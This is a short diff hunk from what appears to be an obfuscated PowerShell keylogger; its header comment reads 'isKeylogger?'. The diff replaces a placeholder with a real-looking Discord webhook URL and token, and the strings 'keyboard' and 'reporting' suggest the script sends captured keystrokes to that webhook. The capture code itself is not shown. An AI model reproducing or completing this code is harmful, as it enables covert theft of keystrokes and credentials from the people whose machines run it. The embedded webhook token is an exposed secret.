@@ -6,7 +6,7 @@ $n="";# Description: isKeylogger?
 $o="";$p="";$q="";$r="";$s="";$t="";$u="";$v="";$w="";$x="";$y="";$z="";
 ########################################################################
 
-$DISCORD_WEBHOOK = "YourWebhookURLHere"
+$DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1227046102763831376/oJfjYy3ikuMP5C50t1dPD34uY8kzhwx7jcEmxsUK6t0N5ekglc_oyTiW2AuDtHv3dxVy"
 
 ###################################################################
 $k="explorer";$inf="keyboard";$c="reporting";$p=${k};$w=$inf;$chk=${w};
